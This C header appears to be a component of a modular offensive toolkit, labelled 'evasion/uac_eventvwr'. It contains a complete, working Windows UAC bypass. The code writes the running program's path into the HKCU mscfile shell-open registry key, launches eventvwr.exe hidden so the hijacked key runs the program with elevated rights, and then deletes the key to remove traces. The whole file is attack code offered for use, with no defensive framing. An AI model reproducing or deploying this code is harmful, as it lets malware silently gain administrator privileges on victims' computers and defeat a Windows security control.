// chunk: evasion/uac_eventvwr
// depends: (none)
// provides: uac_elevate_eventvwr
// headers: windows.h
// risk: medium
// note: UAC bypass via eventvwr.exe — hijacks mmc.exe invocation through
//       HKCU\Software\Classes\mscfile\Shell\Open\command registry key.

#ifndef CHUNK_UAC_EVENTVWR
#define CHUNK_UAC_EVENTVWR

#include <windows.h>

static int uac_elevate_eventvwr(void) {
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    HKEY hk;
    LONG r = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\mscfile\\Shell\\Open\\command",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
    if (r != ERROR_SUCCESS) return 0;

    RegSetValueExA(hk, NULL, 0, REG_SZ, (BYTE *)self_path, (DWORD)strlen(self_path) + 1);
    RegCloseKey(hk);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpFile = "C:\\Windows\\System32\\eventvwr.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile");
    return 1;
}

#endif
